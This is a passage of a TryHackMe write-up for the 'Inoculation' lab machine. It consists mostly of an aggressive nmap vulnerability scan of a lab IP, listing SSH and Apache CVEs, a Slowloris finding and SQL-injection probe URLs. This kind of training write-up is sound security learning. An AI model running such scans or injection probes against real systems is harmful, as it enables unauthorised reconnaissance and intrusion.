class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Inoculation</h1><div class=post-description>Inoculation TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1665 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#obtain-root>Obtain root</a></li></ul></nav></div></details></div><div class=post-content><p>Designed to introduce less common concepts</p><p><a href=https://tryhackme.com/room/inoculation>Inoculation</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Enumeration</li><li>Web Poking</li><li>Misconfigured Binaries</li><li>Kernal Exploitation</li></ul><hr><h2 id=obtain-root>Obtain root<a hidden class=anchor aria-hidden=true href=#obtain-root>#</a></h2><p>Want a challenge? Here you go&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Inoculation$ sudo nmap -A -sC -sV -p- -O --script vuln 10.10.153.127
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 19:30 CEST
+</span></span><span class=line><span class=cl>Pre-scan script results:
+</span></span><span class=line><span class=cl>| broadcast-avahi-dos:
+</span></span><span class=line><span class=cl>|   Discovered hosts:
+</span></span><span class=line><span class=cl>|     224.0.0.251
+</span></span><span class=line><span class=cl>|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+</span></span><span class=line><span class=cl>|_  Hosts are all up (not vulnerable).
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.153.127
+</span></span><span class=line><span class=cl>Host is up (0.035s latency).
+</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+</span></span><span class=line><span class=cl>| vulners:
+</span></span><span class=line><span class=cl>|   cpe:/a:openbsd:openssh:7.2p2:
+</span></span><span class=line><span class=cl>|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
+</span></span><span class=line><span class=cl>|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
+</span></span><span class=line><span class=cl>|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515
+</span></span><span class=line><span class=cl>|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009
+</span></span><span class=line><span class=cl>|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012
+</span></span><span class=line><span class=cl>|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325
+</span></span><span class=line><span class=cl>|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010
+</span></span><span class=line><span class=cl>|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
+</span></span><span class=line><span class=cl>|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
+</span></span><span class=line><span class=cl>|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
+</span></span><span class=line><span class=cl>|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
+</span></span><span class=line><span class=cl>|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
+</span></span><span class=line><span class=cl>|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
+</span></span><span class=line><span class=cl>|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210
+</span></span><span class=line><span class=cl>|       CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
+</span></span><span class=line><span class=cl>|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
+</span></span><span class=line><span class=cl>|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
+</span></span><span class=line><span class=cl>|       CVE-2014-9278   4.0     https://vulners.com/cve/CVE-2014-9278
+</span></span><span class=line><span class=cl>|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
+</span></span><span class=line><span class=cl>|_      CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+</span></span><span class=line><span class=cl>| http-csrf:
+</span></span><span class=line><span class=cl>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.153.127
+</span></span><span class=line><span class=cl>|   Found the following possible CSRF vulnerabilities:
+</span></span><span class=line><span class=cl>|
+</span></span><span class=line><span class=cl>|     Path: http://10.10.153.127:80/
+</span></span><span class=line><span class=cl>|     Form id: hook
+</span></span><span class=line><span class=cl>|_    Form action: testhook.php
+</span></span><span class=line><span class=cl>|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span></span><span class=line><span class=cl>| http-slowloris-check:
+</span></span><span class=line><span class=cl>|   VULNERABLE:
+</span></span><span class=line><span class=cl>|   Slowloris DOS attack
+</span></span><span class=line><span class=cl>|     State: LIKELY VULNERABLE
+</span></span><span class=line><span class=cl>|     IDs:  CVE:CVE-2007-6750
+</span></span><span class=line><span class=cl>|       Slowloris tries to keep many connections to the target web server open and hold
+</span></span><span class=line><span class=cl>|       them open as long as possible.  It accomplishes this by opening connections to
+</span></span><span class=line><span class=cl>|       the target web server and sending a partial request. By doing so, it starves
+</span></span><span class=line><span class=cl>|       the http server&#39;s resources causing Denial Of Service.
+</span></span><span class=line><span class=cl>|
+</span></span><span class=line><span class=cl>|     Disclosure date: 2009-09-17
+</span></span><span class=line><span class=cl>|     References:
+</span></span><span class=line><span class=cl>|       http://ha.ckers.org/slowloris/
+</span></span><span class=line><span class=cl>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+</span></span><span class=line><span class=cl>| http-sql-injection:
+</span></span><span class=line><span class=cl>|   Possible sqli for queries:
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=S%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/fonts/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/fonts/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/fonts/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/fonts/?C=N%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/images/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/images/?C=N%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/images/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/images/?C=M%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|     http://10.10.153.127:80/assets/?C=M%3bO%3dD%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|_    http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
+</span></span><span class=line><span class=cl>|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+</span></span><span class=line><span class=cl>| vulners:
+</span></span><span class=line><span class=cl>|   Apache httpd 2.4.18:
+</span></span><span class=line><span class=cl>|       HTTPD:F564BBA32AA088833DA032B7EB77CA29  7.5     https://vulners.com/httpd/HTTPD:F564BBA32AA088833DA032B7EB77CA29
+</span></span><span class=line><span class=cl>|       HTTPD:E74D6161229FA3D00A1783E6C3426C5D  7.5     https://vulners.com/httpd/HTTPD:E74D6161229FA3D00A1783E6C3426C5D
+</span></span><span class=line><span class=cl>|       HTTPD:C7D2DA1ACB016A5220CA8E74647BED26  7.5     https://vulners.com/httpd/HTTPD:C7D2DA1ACB016A5220CA8E74647BED26
+</span></span><span class=line><span class=cl>|       HTTPD:8F00FB1DD7567228376803FEDB0EC3B6  7.5     https://vulners.com/httpd/HTTPD:8F00FB1DD7567228376803FEDB0EC3B6
+</span></span><span class=line><span class=cl>|       HTTPD:7EEE138FD834328B3FC98E4B7FCAD266  7.5     https://vulners.com/httpd/HTTPD:7EEE138FD834328B3FC98E4B7FCAD266
+</span></span><span class=line><span class=cl>|       HTTPD:24E96D438275A8177C289509C796525C  7.5     https://vulners.com/httpd/HTTPD:24E96D438275A8177C289509C796525C
+</span></span><span class=line><span class=cl>|       HTTPD:237FAB5DE739A612077A245192137A48  7.5     https://vulners.com/httpd/HTTPD:237FAB5DE739A612077A245192137A48
+</span></span><span class=line><span class=cl>|       HTTPD:143F3A43D871E3AFFF956DB1049A6A2A  7.5     https://vulners.com/httpd/HTTPD:143F3A43D871E3AFFF956DB1049A6A2A
+</span></span><span class=line><span class=cl>|       HTTPD:0C6EE30D77005EBF2B39E351B1F3E2C4  7.5     https://vulners.com/httpd/HTTPD:0C6EE30D77005EBF2B39E351B1F3E2C4
+</span></span><span class=line><span class=cl>|       HTTPD:FC354B921BA807DFCACD7CD3C1D02FF9  7.2     https://vulners.com/httpd/HTTPD:FC354B921BA807DFCACD7CD3C1D02FF9
+</span></span><span class=line><span class=cl>|       HTTPD:9CDB89FBD1162B1E462FDF5BEA375759  6.8     https://vulners.com/httpd/HTTPD:9CDB89FBD1162B1E462FDF5BEA375759
+</span></span><span class=line><span class=cl>|       HTTPD:13B5FCC9676077F8FD08063C83511140  6.8     https://vulners.com/httpd/HTTPD:13B5FCC9676077F8FD08063C83511140
+</span></span><span class=line><span class=cl>|       HTTPD:B057D0A07B0AC97248CE6210E08ACAF7  6.4     https://vulners.com/httpd/HTTPD:B057D0A07B0AC97248CE6210E08ACAF7
+</span></span><span class=line><span class=cl>|       HTTPD:99188FFDCAF9C4932D00C218A2E58EC7  6.4     https://vulners.com/httpd/HTTPD:99188FFDCAF9C4932D00C218A2E58EC7
+</span></span><span class=line><span class=cl>|       HTTPD:531CF2A74E1A5A02A1D6AE2505AD586F  6.4     https://vulners.com/httpd/HTTPD:531CF2A74E1A5A02A1D6AE2505AD586F
+</span></span><span class=line><span class=cl>|       HTTPD:1696C4DDCBC58CE20005FCB002958C09  6.0     https://vulners.com/httpd/HTTPD:1696C4DDCBC58CE20005FCB002958C09
+</span></span><span class=line><span class=cl>|       HTTPD:BC81F521379C9038153151EAA84492CA  5.8     https://vulners.com/httpd/HTTPD:BC81F521379C9038153151EAA84492CA
+</span></span><span class=line><span class=cl>|       HTTPD:01BB9C701A4D4302EF59FA7EA89D9115  5.8     https://vulners.com/httpd/HTTPD:01BB9C701A4D4302EF59FA7EA89D9115
+</span></span><span class=line><span class=cl>|       HTTPD:F292DF1CEE1729E4240D1D62A10F5D32  5.1     https://vulners.com/httpd/HTTPD:F292DF1CEE1729E4240D1D62A10F5D32
+</span></span><span class=line><span class=cl>|       HTTPD:CE14FA5A5B1A2BE3A35EA809C9D8CFF7  5.1     https://vulners.com/httpd/HTTPD:CE14FA5A5B1A2BE3A35EA809C9D8CFF7
+</span></span><span class=line><span class=cl>|       HTTPD:79096CA36FAE041205EFAB66A6D4EF4B  5.1     https://vulners.com/httpd/HTTPD:79096CA36FAE041205EFAB66A6D4EF4B
+</span></span><span class=line><span class=cl>|       HTTPD:E91F31FD116386F2922B3EDA4BE3899B  5.0     https://vulners.com/httpd/HTTPD:E91F31FD116386F2922B3EDA4BE3899B
+</span></span><span class=line><span class=cl>|       HTTPD:E05CACB9D575871BA1E3088D02930266  5.0     https://vulners.com/httpd/HTTPD:E05CACB9D575871BA1E3088D02930266
+</span></span><span class=line><span class=cl>|       HTTPD:D7BF4648C333C0F770A30DEB0A23601C  5.0     https://vulners.com/httpd/HTTPD:D7BF4648C333C0F770A30DEB0A23601C
+</span></span><span class=line><span class=cl>|       HTTPD:D5609C15618DCADFDAD5AD396F2B83D7  5.0     https://vulners.com/httpd/HTTPD:D5609C15618DCADFDAD5AD396F2B83D7
+</span></span><span class=line><span class=cl>|       HTTPD:D5091608B1DC5DB5CABE405261B7658E  5.0     https://vulners.com/httpd/HTTPD:D5091608B1DC5DB5CABE405261B7658E
+</span></span><span class=line><span class=cl>|       HTTPD:D26626D944F16D90B877FB157E4A128F  5.0     https://vulners.com/httpd/HTTPD:D26626D944F16D90B877FB157E4A128F
+</span></span><span class=line><span class=cl>|       HTTPD:D0D55654F7429E8A4965CBBE30779CD6  5.0     https://vulners.com/httpd/HTTPD:D0D55654F7429E8A4965CBBE30779CD6
+</span></span><span class=line><span class=cl>|       HTTPD:C191D6FAD0C97D0A2E0A2A9F7BFE6B38  5.0     https://vulners.com/httpd/HTTPD:C191D6FAD0C97D0A2E0A2A9F7BFE6B38
+</span></span><span class=line><span class=cl>|       HTTPD:BD5F2FE0FF24D28F3450C11422A68AC8  5.0     https://vulners.com/httpd/HTTPD:BD5F2FE0FF24D28F3450C11422A68AC8
+</span></span><span class=line><span class=cl>|       HTTPD:B2B68FFCE0FB45D09BE91EE9ECBA07F6  5.0     https://vulners.com/httpd/HTTPD:B2B68FFCE0FB45D09BE91EE9ECBA07F6
+</span></span><span class=line><span class=cl>|       HTTPD:A5459AF02C9EC35CE80EA173C36C3F47  5.0     https://vulners.com/httpd/HTTPD:A5459AF02C9EC35CE80EA173C36C3F47
+</span></span><span class=line><span class=cl>|       HTTPD:99477914E1BE8FA85CEA0E956232C4C2  5.0     https://vulners.com/httpd/HTTPD:99477914E1BE8FA85CEA0E956232C4C2
+</span></span><span class=line><span class=cl>|       HTTPD:824D39D8A30F1234C966CBDA41E1C446  5.0     https://vulners.com/httpd/HTTPD:824D39D8A30F1234C966CBDA41E1C446
+</span></span><span class=line><span class=cl>|       HTTPD:73656ED41609146303D488C86337BC2D  5.0     https://vulners.com/httpd/HTTPD:73656ED41609146303D488C86337BC2D
+</span></span><span class=line><span class=cl>|       HTTPD:6CAC4F8B58BB2BE168795A6BA0CA26A1  5.0     https://vulners.com/httpd/HTTPD:6CAC4F8B58BB2BE168795A6BA0CA26A1
+</span></span><span class=line><span class=cl>|       HTTPD:5D6E315A1B98558C0DF8CBE51264FBA5  5.0     https://vulners.com/httpd/HTTPD:5D6E315A1B98558C0DF8CBE51264FBA5
+</span></span><span class=line><span class=cl>|       HTTPD:4EC9662496A151DDE6D030D9127572E7  5.0     https://vulners.com/httpd/HTTPD:4EC9662496A151DDE6D030D9127572E7
+</span></span><span class=line><span class=cl>|       HTTPD:42FA2547862AB3B3F5E7F776E2D90614  5.0     https://vulners.com/httpd/HTTPD:42FA2547862AB3B3F5E7F776E2D90614
+</span></span><span class=line><span class=cl>|       HTTPD:3647863A8E4AE972669D5EE60974E777  5.0     https://vulners.com/httpd/HTTPD:3647863A8E4AE972669D5EE60974E777
+</span></span><span class=line><span class=cl>|       HTTPD:18105DABC6D0ADE97D12B90F63EAE025  5.0     https://vulners.com/httpd/HTTPD:18105DABC6D0ADE97D12B90F63EAE025
+</span></span><span class=line><span class=cl>|       HTTPD:174A0D44882BCA7E2F229BC91D6D5A09  5.0     https://vulners.com/httpd/HTTPD:174A0D44882BCA7E2F229BC91D6D5A09
+</span></span><span class=line><span class=cl>|       HTTPD:04C30566E99EFB3C0D60F08EE2524591  5.0     https://vulners.com/httpd/HTTPD:04C30566E99EFB3C0D60F08EE2524591
+</span></span><span class=line><span class=cl>|       HTTPD:FF57290724543D4766EDDC4666992FE8  4.3     https://vulners.com/httpd/HTTPD:FF57290724543D4766EDDC4666992FE8
+</span></span><span class=line><span class=cl>|       HTTPD:F4FBBB7467F08F96828B98E753E5FE7D  4.3     https://vulners.com/httpd/HTTPD:F4FBBB7467F08F96828B98E753E5FE7D
+</span></span><span class=line><span class=cl>|       HTTPD:D94ACD37B5627A621B2D592BD44873F2  4.3     https://vulners.com/httpd/HTTPD:D94ACD37B5627A621B2D592BD44873F2
+</span></span><span class=line><span class=cl>|       HTTPD:D26FFC4C8AA598C5F130A0223836644E  4.3     https://vulners.com/httpd/HTTPD:D26FFC4C8AA598C5F130A0223836644E
